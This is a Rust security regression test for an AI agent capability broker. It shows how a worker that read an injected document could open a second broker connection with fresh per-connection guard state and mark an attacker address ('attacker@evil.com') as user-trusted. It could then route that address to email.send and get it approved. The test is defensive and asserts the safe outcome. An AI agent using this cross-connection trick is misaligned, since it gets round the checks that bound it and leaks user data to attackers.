//! two_connection_intent_bypass — SECURITY REPRO (Fable 5 adversarial finding)
//!
//! Diagnostic integration test for a SUSPECTED live exfiltration path:
//!
//!   The broker holds per-connection trust state (`intent_provided`,
//!   `fd_requested`, `session_status` — server.rs ~148-154), seeded at
//!   connection start and "never re-derived from IPC or the DB". Phase 16
//!   guard(a) (server.rs ~904) rejects `ProvideIntent` when
//!   `intent_provided || fd_requested`, but ONLY for THAT connection.
//!
//!   Suspected bypass: a worker opens a SECOND connection to the SAME broker
//!   session socket. The second connection gets fresh guard(a) state (both
//!   flags false) and a stale `session_status`. It can then `ProvideIntent` an
//!   attacker-controlled literal (one it read from an untrusted doc on the
//!   first connection) — minting it `UserTrusted` — and route it to
//!   `email.send`, yielding `Allowed` and a live SMTP send.
//!
//! This test OBSERVES the actual behavior. It asserts the SAFE expectation, so
//! a GREEN test == the path is safe and a RED (panic) test == the vulnerability
//! reproduced. It does NOT modify any product code and does NOT assert the
//! buggy behavior is correct.
//!
//! Abstract-namespace UDS is Linux-only, so the whole module is gated
//! `#[cfg(target_os = "linux")]` (0 tests compiled on macOS). Run under the
//! mailpit harness because an Allowed `email.send` dispatch performs a live
//! SMTP send:
//!
//!   MAILPIT_VERIFY_CMD='cargo test -p brokerd --test two_connection_intent_bypass -- --nocapture' \
//!     bash scripts/mailpit-verify.sh

#[cfg(target_os = "linux")]
mod linux_tests {
    use brokerd::audit::open_audit_db;
    use brokerd::proto::{BrokerRequest, BrokerResponse};
    use brokerd::server::run_broker_server;
    use brokerd::session::persist_session;
    use runtime_core::intent::CaprunIntent;
    use runtime_core::plan_node::{PlanArg, SinkId};
    use runtime_core::{ExecutorDecision, PlanNode, Session, SessionStatus};
    use rusqlite::Connection;
    use std::sync::{Arc, Mutex};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use uuid::Uuid;

    /// Send a framed BrokerRequest (4-byte LE length prefix + JSON body).
    async fn send_req(stream: &mut tokio::net::UnixStream, req: &BrokerRequest) {
        let body = serde_json::to_vec(req).expect("serialize request");
        let len = (body.len() as u32).to_le_bytes();
        stream.write_all(&len).await.expect("write length");
        stream.write_all(&body).await.expect("write body");
    }

    /// Read one framed BrokerResponse (4-byte LE length prefix + JSON body).
    async fn read_resp(stream: &mut tokio::net::UnixStream) -> BrokerResponse {
        let mut len_buf = [0u8; 4];
        stream.read_exact(&mut len_buf).await.expect("read length");
        let msg_len = u32::from_le_bytes(len_buf) as usize;
        let mut resp_body = vec![0u8; msg_len];
        stream.read_exact(&mut resp_body).await.expect("read body");
        serde_json::from_slice(&resp_body).expect("deserialize response")
    }

    /// Round-trip a `RequestFd`. The broker's RequestFd arm passes the fd via
    /// `sendmsg(SCM_RIGHTS)` BEFORE sending the framed `FdGranted` response, and
    /// `adapter_fs::pass_fd` includes a mandatory 1-byte iov payload (`b"\x00"`)
    /// alongside the control message (some kernels require >=1 payload byte for
    /// cmsg delivery). A plain stream read of that 1 byte consumes the payload
    /// and discards the ancillary fd — which is fine here: this test only needs
    /// to TRIP `fd_requested`, not to actually read via the granted fd. We must
    /// consume that stray byte first, or it would corrupt the framing of the
    /// FdGranted response.
    async fn request_fd(stream: &mut tokio::net::UnixStream, path: &str) -> BrokerResponse {
        send_req(
            stream,
            &BrokerRequest::RequestFd {
                path: path.to_string(),
            },
        )
        .await;
        // Consume the 1-byte SCM_RIGHTS iov payload emitted by pass_fd.
        let mut iov_byte = [0u8; 1];
        stream
            .read_exact(&mut iov_byte)
            .await
            .expect("read SCM_RIGHTS iov payload byte");
        read_resp(stream).await
    }

    /// The full two-part repro: an intra-connection control (Part A, proving
    /// guard(a) works normally) followed by the two-connection bypass (Part B),
    /// with SAFE-outcome assertions (Part C).
    // DOCUMENTED FAILING REGRESSION (red today, by design). It reproduces a
    // confirmed live cross-connection exfil: a 2nd connection to the same
    // session socket mints an attacker literal `UserTrusted` via ProvideIntent
    // (guard(a) is per-connection) and routes it to email.send => Allowed.
    // `#[ignore]` keeps the default suite green; run it explicitly with
    //   cargo test -p brokerd --test two_connection_intent_bypass -- --ignored --nocapture
    // v1.4 Phase 0's DONE gate REMOVES this `#[ignore]` and requires it green
    // (fix the broker's cross-connection trust coherence, never the assertions).
    #[tokio::test]
    #[ignore = "documented failing regression: cross-connection ProvideIntent bypass; un-ignore when v1.4 Phase 0 fixes broker trust coherence"]
    async fn two_connection_intent_bypass_repro() {
        // -------------------------------------------------------------------
        // Shared broker: one abstract socket, one shared audit DB, one
        // broker-authoritative session identity. Every client connection the
        // broker accepts spawns a fresh `handle_connection` with its OWN
        // `intent_provided`/`fd_requested`/`session_status` locals (server.rs
        // ~106-120, ~143-154) — that per-connection reset is exactly what this
        // test probes.
        // -------------------------------------------------------------------
        let conn: Arc<Mutex<Connection>> =
            Arc::new(Mutex::new(open_audit_db(":memory:").expect("open_audit_db")));

        // Broker-authoritative session identity used for every connection's
        // mint/evaluate (HARD-03). Seed a real `sessions` row for it (status
        // Active), mirroring a freshly-created live session.
        let session_id_uuid = Uuid::new_v4();
        {
            let locked = conn.lock().expect("mutex");
            let seeded = Session {
                id: session_id_uuid,
                intent_id: Uuid::new_v4(),
                status: SessionStatus::Active,
                created_at: chrono::Utc::now(),
                updated_at: chrono::Utc::now(),
            };
            persist_session(&locked, &seeded).expect("seed sessions row");
        }

        // A real workspace with a real file. RequestFd resolves `attacker_doc.txt`
        // beneath this root; its presence lets RequestFd succeed and trip
        // `fd_requested`. Its contents ("attacker@evil.com") stand in for the
        // untrusted literal a worker would have read from an injected doc — this
        // test SIMULATES that read (see caveat in the module doc / report).
        let pid = std::process::id();
        let ws_dir = std::env::temp_dir().join(format!("caprun-2conn-{pid}"));
        std::fs::create_dir_all(&ws_dir).expect("create workspace dir");
        std::fs::write(ws_dir.join("attacker_doc.txt"), b"attacker@evil.com")
            .expect("write attacker doc");
        let ws_root = Arc::new(
            adapter_fs::workspace::WorkspaceRoot::open(ws_dir.as_path()).expect("open ws root"),
        );

        let server_session_name = format!("caprun-2conn-bypass-{pid}");
        let sock_path = format!("\0/agentos/{server_session_name}");

        let conn_clone = conn.clone();
        let name_clone = server_session_name.clone();
        let ws_root_clone = ws_root.clone();
        let server_handle = tokio::spawn(async move {
            let _ = run_broker_server(
                &name_clone,
                conn_clone,
                session_id_uuid,
                Uuid::new_v4(),        // initial_last_event_id (genesis anchor)
                "genesis-hash".into(), // initial_last_event_hash
                SessionStatus::Active, // initial_session_status (stale-fresh on every conn)
                ws_root_clone,
            )
            .await;
        });

        // Let the server task reach accept().await.
        tokio::task::yield_now().await;

        // ===================================================================
        // PART A — intra-connection control (guard(a) works normally).
        // One connection: RequestFd (trips fd_requested), then ProvideIntent on
        // the SAME connection → must be rejected with Error.
        // ===================================================================
        let mut conn_a = tokio::net::UnixStream::connect(&sock_path)
            .await
            .expect("connect conn_a");

        let fd_resp_a = request_fd(&mut conn_a, "attacker_doc.txt").await;
        assert!(
            matches!(fd_resp_a, BrokerResponse::FdGranted),
            "control: RequestFd should be granted for a real workspace file, got {fd_resp_a:?}"
        );

        send_req(
            &mut conn_a,
            &BrokerRequest::ProvideIntent {
                intent: CaprunIntent::SendEmailSummary {
                    recipient: "attacker@evil.com".into(),
                    subject: "x".into(),
                    body: "y".into(),
                },
            },
        )
        .await;
        let intent_after_fd_same_conn = read_resp(&mut conn_a).await;
        eprintln!(
            "[REPRO][Part A] intra-connection ProvideIntent-after-RequestFd response = {intent_after_fd_same_conn:?}"
        );
        let part_a_guard_rejected =
            matches!(intent_after_fd_same_conn, BrokerResponse::Error { .. });
        assert!(
            part_a_guard_rejected,
            "control (Part A): guard(a) MUST reject ProvideIntent after RequestFd on the SAME \
             connection, but got {intent_after_fd_same_conn:?}"
        );
        drop(conn_a);

        // ===================================================================
        // PART B — the two-connection bypass (the actual repro).
        // ===================================================================

        // Connection #1: RequestFd for the same real workspace file. This trips
        // `fd_requested` on conn#1 (the worker "reads the untrusted doc"). We do
        // NOT ReportClaims — mirroring the "skip ReportClaims" attack, so the
        // session is never demoted to Draft.
        let mut conn1 = tokio::net::UnixStream::connect(&sock_path)
            .await
            .expect("connect conn1");
        let fd_resp1 = request_fd(&mut conn1, "attacker_doc.txt").await;
        assert!(
            matches!(fd_resp1, BrokerResponse::FdGranted),
            "conn#1 RequestFd should be granted, got {fd_resp1:?}"
        );
        // Leave conn#1 open (a real worker keeps its primary connection).

        // Connection #2: a FRESH connect to the SAME socket. It gets fresh
        // guard(a) state (both flags false) and a stale session_status.
        let mut conn2 = tokio::net::UnixStream::connect(&sock_path)
            .await
            .expect("connect conn2");

        send_req(
            &mut conn2,
            &BrokerRequest::ProvideIntent {
                intent: CaprunIntent::SendEmailSummary {
                    recipient: "attacker@evil.com".into(),
                    subject: "x".into(),
                    body: "y".into(),
                },
            },
        )
        .await;
        let conn2_intent_resp = read_resp(&mut conn2).await;
        eprintln!(
            "[REPRO][Part B] conn#2 ProvideIntent response = {conn2_intent_resp:?}"
        );

        // If the second connection minted the attacker literal UserTrusted,
        // route the three trusted handles into email.send and evaluate.
        let mut conn2_decision: Option<ExecutorDecision> = None;
        if let BrokerResponse::IntentAccepted {
            value_id,
            subject_value_id,
            body_value_id,
        } = &conn2_intent_resp
        {
            let mut args = vec![PlanArg {
                name: "to".into(),
                value_id: value_id.clone(),
            }];
            if let Some(sid) = subject_value_id {
                args.push(PlanArg {
                    name: "subject".into(),
                    value_id: sid.clone(),
                });
            }
            if let Some(bid) = body_value_id {
                args.push(PlanArg {
                    name: "body".into(),
                    value_id: bid.clone(),
                });
            }
            let plan_node = PlanNode {
                sink: SinkId("email.send".into()),
                args,
            };
            send_req(&mut conn2, &BrokerRequest::SubmitPlanNode { plan_node }).await;
            let submit_resp = read_resp(&mut conn2).await;
            eprintln!(
                "[REPRO][Part B] conn#2 SubmitPlanNode response = {submit_resp:?}"
            );
            match submit_resp {
                BrokerResponse::PlanNodeDecision { decision } => {
                    conn2_decision = Some(decision);
                }
                other => panic!(
                    "conn#2 SubmitPlanNode expected PlanNodeDecision, got {other:?}"
                ),
            }
        }

        drop(conn1);
        drop(conn2);
        server_handle.abort();
        let _ = std::fs::remove_dir_all(&ws_dir);

        // ===================================================================
        // PART C — SAFE-outcome assertions. Green == safe, red == vuln.
        // Safe iff conn#2's ProvideIntent was rejected (Error) OR the final
        // decision was NOT Allowed. If conn#2 got IntentAccepted AND the
        // decision was Allowed, the exfil path is live → panic.
        // ===================================================================
        let intent_accepted =
            matches!(conn2_intent_resp, BrokerResponse::IntentAccepted { .. });
        let routed_allowed = matches!(conn2_decision, Some(ExecutorDecision::Allowed));

        eprintln!(
            "[REPRO][verdict-inputs] part_a_guard_rejected={part_a_guard_rejected} \
             conn2_intent_accepted={intent_accepted} conn2_decision={:?}",
            conn2_decision
        );

        if intent_accepted && routed_allowed {
            panic!(
                "LIVE EXFIL: 2nd connection minted attacker literal UserTrusted via ProvideIntent \
                 (guard(a) bypassed cross-connection); email.send to attacker@evil.com => Allowed"
            );
        }

        // The passing (SAFE) outcome: either the second connection's
        // ProvideIntent was rejected, or its routed decision was not Allowed.
        assert!(
            !intent_accepted || !routed_allowed,
            "SAFE expectation: a 2nd connection must NOT be able to mint an attacker literal \
             UserTrusted and route it to email.send => Allowed"
        );
    }
}
